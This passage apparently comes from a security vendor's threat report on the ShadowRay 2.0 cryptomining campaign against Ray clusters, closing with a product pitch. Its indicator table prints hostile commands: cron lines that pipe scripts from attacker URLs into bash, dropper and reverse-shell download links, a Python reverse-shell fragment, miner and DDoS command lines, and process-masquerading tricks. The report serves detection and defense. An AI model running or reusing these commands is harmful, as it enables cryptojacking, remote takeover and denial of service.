| GitLab User  | least3654  |   | Attacker's 1st stage GitLab previous organization (blocked)

| GitHub user  | thisisforwork440-ops  |   | Attacker's 2nd phase GitHub organization

| URL  | https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh  | 443  | Monitoring/persistence script

| URL  | https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/aa.sh  | 443  | Cleanup/setup script

| URL  | https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/run.sh  | 443  | Main execution script (non-China)

| URL  | https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/run-CN.sh  | 443  | China-specific payload

| URL  | https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz  | 443  | Legitimate XMRig download (v6.16.4)

| URL  | https://github.com/rigelminer/rigel/releases/download/1.22.3/rigel-1.22.3-linux.tar.gz  |   | Optimized GPU Miner used in 2nd phase of the campaign

| URL  | http://45.61.150.83/1mmy/xd.sh  | 80  | Malware Dropper from attacker’s controlled file server - used in 2nd phase of the campaign

| URL  | http://45.61.150.83/1mmy/cloud  | 80  | Malware Dropper from attacker’s controlled file server - used in 2nd phase of the campaign

| SHA256  | 6f445252494a0908ab51d526e09134cebc33a199384771acd58c4a87f1ffc063  |   | SHA256 of the XMRig Binary from GitHub (version 6.16.4)

| SHA256  | 1f6c69403678646a60925dcffe8509d22bb570c611324b93bec9aea72024ef6b  |   | Hash of secondary bash dropped/unpacker (xd.sh)

| MD5  | 1f63fa7921c2f5fb8f8ffa430d02ac4a  |   | Hash of secondary bash dropped/unpacker (xd.sh)

| SHA1  | 779a8af3b9838a33d1e199da3fc2f02a49e7c13e  |   | Hash of secondary bash dropped/unpacker (xd.sh)

| URL  | http://67.217.57.240:666/files/netsh  | 666  | Malicious binary download - reverse shell

| Filename  | dns-filter  |   | Masqueraded XMRig miner binary

| Path  | /usr/lib/dev/systemdev/dns-filter  |   | Full path to disguised miner

| Filename  | .python3.6  |   | Hidden XMRig miner binary (note the leading dot)

| Filename  | rigel  |   | GPU Optimized Cryptominer from https://github.com/rigelminer/rigel/releases/download/1.22.3/

| Filename  | python3.7.3  |   | GPU Optimized Cryptominer from https://github.com/rigelminer/rigel/releases/download/1.22.3/

| Filename  | netsh  |   | Downloaded malicious binary

| Filename  | sockstress  |   | DDoS tool binary

| Path  | /tmp/dns  |   | Alternative XMRig binary location

| Filename  | mon.sh  |   | Monitoring and persistence script

| Filename  | aa.sh  |   | Cleanup and setup script

| Filename  | aa_clean.sh  |   | Cleanup script variant (competition elimination)

| Filename  | run.sh  |   | Main execution script (non-China regions)

| Filename  | run-CN.sh  |   | China-specific payload with network proxy

| Filename  | .ddns.sh  |   | Persistence script

| Filename  | xd.sh  |   | Payload found in Second

| Filename  | cloud.txt  |   |

| Path  | /var/tmp/.ddns.sh  |   | Full path to persistence script

| Process Name  | kworker/0:0  |   | Masqueraded as legitimate Linux kernel worker

| Process Name  | dns-filter  |   | Masqueraded as DNS filtering service

| Process Name  | [kworker/0:0]  |   | Bracket notation indicates process name manipulation via /proc/$$/comm

| Command Line  | /usr/lib/dev/systemdev/dns-filter -o [host] --tls  |   | XMRig mining to C2 with TLS

| Command Line  | python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(([host],[port]));  |   | Reverse shell payload

| Command Line  | ./sockstress eth0 -p payloads/http  |   | DDoS attack command

| Command Line  | /bin/bash /var/tmp/.ddns.sh  |   | Persistence script execution

| Cron Entry  | */15 * * * * wget -O - https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bash  |   | Executes monitoring script every 15 minutes

| Cron Entry  | */15 * * * * curl -s https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bash  |   | Alternative with curl

| Path  | /etc/init.d/dns-filter  |   | Persistence via init.d

| Path  | ~/.bashrc  |   | Malicious commands injected into user shell profile

| Technique  | NodeAffinitySchedulingStrategy  |   | Ray feature weaponized for lateral movement

| /etc/hosts Entry  | Block entries for rival mining pools  |   | Modified to block competitors

| iptables Rules  | iptables -A OUTPUT -p tcp --dport 3333 -j DROP  |   | Blocking Monero mining port

| iptables Rules  | iptables -A OUTPUT -p tcp --dport 5555 -j DROP  |   | Blocking alternative mining port

| iptables Rules  | iptables -A OUTPUT -p tcp --dport 7777 -j DROP  |   | Blocking alternative mining port

| Process Killing  | Targets: xmrig, minerd, ccminer, crypto-pool, etc.  |   | Active termination of rival miners

| Script Logic  | China IP range detection using http://ip-api.com/json/  |   | Delivers region-specific payloads

| Script Logic  | run-CN.sh execution for Chinese IPs payloads  |   | Uses GitHub proxy for network access

| Resource Allocation  | 60% CPU/GPU allocation to hide activity  |   | Configured to avoid detection

| Process Renaming  | echo "kworker/0:0" > /proc/$$/comm  |   | Masquerades as kernel process

If you have any questions and need help assessing your environment, you can schedule a threat briefing with our research team by reaching out to info@oligosecurity.io.

‍

# How Oligo Protects Against Exploits of the ShadowRay Vulnerability

ShadowRay 2.0 underscores how quickly and broadly a flaw, coupled with misconfigurations, can escalate into easily propagated compromise – and also why runtime context is the source of truth that security teams need. With Oligo, teams gain deterministic proof of exploitability, real-time detection of malicious behavior, and automatic correlation across every step of the modern attack chain. Instead of drowning in theoretical alerts or reacting after the fact, security teams can confidently identify and prevent threats like this the moment they emerge.

See below for examples of how Oligo’s runtime security platform can detect and prevent techniques like those used in the ShadowRay 2.0 campaign.

Above, you can see Oligo’s ability to identify a suspicious process initiating a reverse shell to malicious domain and spawning a cryptominer – combining CWPP-grade visibility with function-level context so that the exploit is captured in real time.

This figure shows how an Oligo user can drill directly into the malicious payload, tracing the reverse shell execution flow inside Python through decision-tree logic the attacker abused.

This highlights Oligo’s runtime detection of stack deviation inside of Ray, where an unexpected syscall leads to unauthorized process creation. By correlating this anomaly with the reverse shell activity and cryptominer execution, Oligo automatically generates a high-fidelity incident – providing proof of the exploit and full attack chain in a single, explainable view.

# Book A Demo

If you’re interested in learning how Oligo’s runtime security platform unifies real-time protection across applications, cloud, workloads, and AI systems, set some time to connect [here](https://www.oligo.security/demo).

## Stop modern attacks and keep your business moving

[Request a demo

Request a demo

→

→](https://www.oligo.security/demo)

https://www.oligo.security/

https://www.oligo.security/lp/oligo-named-frost-sullivan-2026-company-of-the-year-in-adr

Platform

[Overview](https://www.oligo.security/runtime-platform/overview)

[Runtime protection](https://www.oligo.security/runtime-platform/cloud-application-detection-and-response)

[Runtime posture](https://www.oligo.security/runtime-platform/runtime-vulnerability-management)

[Runtime AI security](https://www.oligo.security/runtime-platform/runtime-ai)

[Oligo sensor](https://www.oligo.security/sensor)

Solutions

Who it's for

[Security leaders](https://www.oligo.security/solutions/security-leadership)

[SecOps pros](https://www.oligo.security/solutions/security-operations)

[AppSec pros](https://www.oligo.security/solutions/application-security)

[CloudSec pros](https://www.oligo.security/solutions/cloud-security)

Use Cases

[Runtime exploit blocking](https://www.oligo.security/solutions/exploit-blocking)

[Real-time bom/vex](https://www.oligo.security/solutions/real-time-bom)

[Discover Shadow Vulnerabilities](https://www.oligo.security/solutions/shadow-vulnerabilities)

[Application vulnerability management](https://www.oligo.security/solutions/application-vulnerability-management)

[AI security](https://www.oligo.security/solutions/ai-security-management)

[Workload protection](https://www.oligo.security/solutions/workload-protection)

[Compliance and assurance](https://www.oligo.security/solutions/compliance-and-assurance)

[Attack detection and response](https://www.oligo.security/solutions/detection-and-response)

[Supply chain security](https://www.oligo.security/solutions/supply-chain-security)

Resources

[Resource hub](https://www.oligo.security/resource-hub)

[Blog](https://www.oligo.security/resources/blog)

[Runtime academy](https://www.oligo.security/academy)

[Events](https://www.oligo.security/resources/events)

[Webinars](https://www.oligo.security/resources/webinars-and-videos)

[Threat research](https://www.oligo.security/resources/blog?category=Research)

[App attack matrix](https://app-attack-matrix.com/)

Company

[About us](https://www.oligo.security/company/about)

[Why Oligo](https://www.oligo.security/company/why-oligo)

[Newsroom](https://www.oligo.security/resources/news)

[Partners](https://www.oligo.security/company/partners)

[Careers](https://www.oligo.security/company/careers)

[Contact us](https://www.oligo.security/contact-us)

[Compare](https://www.oligo.security/comparison/oligo-compared-to-other-solutions)

Copyright © Oligo Security | All Rights Reserved 2026

[Terms of use](https://www.oligo.security/legal/terms-of-use)[Privacy Policy](https://www.oligo.security/legal/privacy-policy)[Cookie policy](https://www.oligo.security/legal/cookie-policy)

[YOUTUBE](https://www.youtube.com/@oligosec)

[LINKEDIN](https://www.linkedin.com/company/oligo-security/)

[TWITTER](https://x.com/OligoSecurity)
